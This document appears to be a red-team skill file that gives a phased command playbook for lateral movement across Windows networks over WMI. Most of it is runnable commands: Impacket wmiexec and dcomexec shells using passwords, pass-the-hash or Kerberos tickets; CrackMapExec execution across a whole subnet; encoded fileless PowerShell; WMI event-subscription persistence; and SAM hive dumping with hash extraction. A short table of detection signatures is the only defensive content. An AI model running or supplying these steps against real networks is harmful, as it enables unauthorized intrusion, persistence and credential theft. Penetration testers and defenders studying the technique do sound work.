---
name: performing-lateral-movement-with-wmiexec
description: Perform lateral movement across Windows networks using WMI-based remote execution techniques including Impacket wmiexec.py, CrackMapExec, and native WMI commands for stealthy post-exploitation during red team engagements.
domain: cybersecurity
subdomain: red-teaming
tags: [red-team, lateral-movement, wmiexec, wmi, post-exploitation, impacket, windows]
version: "1.0"
author: mahipal
license: Apache-2.0
---
# Performing Lateral Movement with WMIExec

## Overview

WMI (Windows Management Instrumentation) is a legitimate Windows administration framework that red teams abuse for lateral movement because it provides remote command execution without deploying additional services or leaving obvious artifacts like PsExec. Impacket's wmiexec.py creates a semi-interactive shell over WMI by executing commands through Win32_Process.Create and reading output via temporary files on ADMIN$ share. Unlike PsExec, WMIExec does not install a service on the target, making it stealthier and less likely to trigger security alerts. WMI-based lateral movement maps to MITRE ATT&CK T1047 (Windows Management Instrumentation) and is used by threat actors including APT29, APT32, and Lazarus Group.

## Objectives

- Execute remote commands on Windows targets using WMI-based techniques
- Establish semi-interactive shells via Impacket wmiexec.py
- Perform lateral movement with Pass-the-Hash using WMI
- Use CrackMapExec for multi-target WMI command execution
- Execute native PowerShell WMI commands for fileless lateral movement
- Chain WMI with credential harvesting for network-wide access

## MITRE ATT&CK Mapping

- **T1047** - Windows Management Instrumentation
- **T1021.003** - Remote Services: Distributed Component Object Model (DCOM)
- **T1550.002** - Use Alternate Authentication Material: Pass the Hash
- **T1059.001** - Command and Scripting Interpreter: PowerShell
- **T1570** - Lateral Tool Transfer

## Implementation Steps

### Phase 1: WMIExec with Impacket
1. Execute a semi-interactive shell with credentials:
   ```bash
   # With cleartext password
   wmiexec.py domain.local/admin:'Password123'@10.10.10.50

   # With NT hash (Pass-the-Hash)
   wmiexec.py -hashes :a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 domain.local/admin@10.10.10.50

   # With Kerberos ticket
   export KRB5CCNAME=admin.ccache
   wmiexec.py -k -no-pass domain.local/admin@TARGET01.domain.local

   # Execute specific command (non-interactive)
   wmiexec.py domain.local/admin:'Password123'@10.10.10.50 "ipconfig /all"
   ```
2. Execute commands without output file (stealthier using DCOM):
   ```bash
   # Using dcomexec.py as alternative (MMC20.Application DCOM object)
   dcomexec.py -object MMC20 domain.local/admin:'Password123'@10.10.10.50

   # Using ShellWindows DCOM object
   dcomexec.py -object ShellWindows domain.local/admin:'Password123'@10.10.10.50
   ```

### Phase 2: CrackMapExec Multi-Target Execution
1. Execute commands across multiple targets:
   ```bash
   # Execute single command on subnet
   crackmapexec wmi 10.10.10.0/24 -u admin -p 'Password123' -x "whoami"

   # Execute with hash
   crackmapexec wmi 10.10.10.0/24 -u admin -H a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 -x "ipconfig"

   # Execute PowerShell command
   crackmapexec wmi 10.10.10.0/24 -u admin -p 'Password123' -X "Get-Process"

   # Check local admin access via WMI
   crackmapexec wmi 10.10.10.0/24 -u admin -p 'Password123'
   ```

### Phase 3: Native WMI Commands (Windows)
1. Execute remote commands using built-in Windows WMI tools:
   ```powershell
   # Using wmic.exe (deprecated but still available)
   wmic /node:10.10.10.50 /user:domain\admin /password:Password123 process call create "cmd.exe /c whoami > C:\temp\out.txt"

   # Using PowerShell Invoke-WmiMethod
   $cred = Get-Credential
   Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 10.10.10.50 `
     -Credential $cred -ArgumentList "cmd.exe /c ipconfig > C:\temp\output.txt"

   # Using CIM sessions (modern replacement for WMI)
   $session = New-CimSession -ComputerName 10.10.10.50 -Credential $cred
   Invoke-CimMethod -CimSession $session -ClassName Win32_Process `
     -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"}
   ```
2. Fileless PowerShell execution via WMI:
   ```powershell
   # Execute encoded PowerShell command remotely
   $cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process | Out-File C:\temp\procs.txt'))
   Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 10.10.10.50 `
     -Credential $cred -ArgumentList "powershell.exe -enc $cmd"
   ```

### Phase 4: WMI-Based Persistence
1. Create WMI event subscriptions for persistence:
   ```powershell
   # Create WMI event subscription (command runs on every logon)
   $filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter `
     -Arguments @{Name="PersistFilter"; EventNamespace="root\cimv2";
                  QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}

   $consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer `
     -Arguments @{Name="PersistConsumer"; CommandLineTemplate="cmd.exe /c <payload>"}

   Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding `
     -Arguments @{Filter=$filter; Consumer=$consumer}
   ```

### Phase 5: Chaining with Credential Harvesting
1. Use WMI for remote credential extraction:
   ```bash
   # Dump SAM hashes via WMI + reg save
   wmiexec.py domain.local/admin:'Password123'@10.10.10.50 "reg save HKLM\SAM C:\temp\sam && reg save HKLM\SYSTEM C:\temp\system"

   # Download saved hives
   smbclient.py domain.local/admin:'Password123'@10.10.10.50
   > get C:\temp\sam
   > get C:\temp\system

   # Extract hashes from saved hives
   secretsdump.py -sam sam -system system LOCAL
   ```

## Tools and Resources

| Tool | Purpose | Platform |
|------|---------|----------|
| wmiexec.py | Semi-interactive WMI shell (Impacket) | Linux (Python) |
| dcomexec.py | DCOM-based remote execution (Impacket) | Linux (Python) |
| CrackMapExec | Multi-target WMI execution | Linux (Python) |
| wmic.exe | Native Windows WMI command-line tool | Windows |
| PowerShell CIM | Modern WMI cmdlets | Windows |
| SharpWMI | .NET WMI execution tool | Windows (.NET) |

## WMI Execution Methods Comparison

| Method | Service Created | Output Method | Stealth Level |
|--------|----------------|---------------|---------------|
| wmiexec.py | No | Temp file on ADMIN$ | Medium |
| dcomexec.py | No | Temp file on ADMIN$ | Medium-High |
| wmic.exe | No | None (blind) or redirect | Medium |
| PowerShell WMI | No | None (blind) or redirect | High |
| PsExec (comparison) | Yes | Service output pipe | Low |

## Detection Signatures

| Indicator | Detection Method |
|-----------|-----------------|
| Win32_Process.Create WMI calls | Event 4688 (process creation) with WMI parent process |
| WMI temporary output files on ADMIN$ | File monitoring on ADMIN$ share for temp files |
| Remote WMI connections (DCOM/135) | Network monitoring for DCOM traffic to workstations |
| WmiPrvSE.exe spawning cmd.exe/powershell.exe | EDR process tree analysis |
| Event 5857/5860/5861 | WMI Activity logs in Microsoft-Windows-WMI-Activity |

## Validation Criteria

- [ ] WMIExec shell established on remote target
- [ ] Pass-the-Hash execution validated via WMI
- [ ] Multi-target command execution via CrackMapExec WMI
- [ ] Native PowerShell WMI commands executed remotely
- [ ] Credential harvesting performed via WMI execution chain
- [ ] No service creation artifacts on target systems
- [ ] Evidence documented with command outputs and screenshots
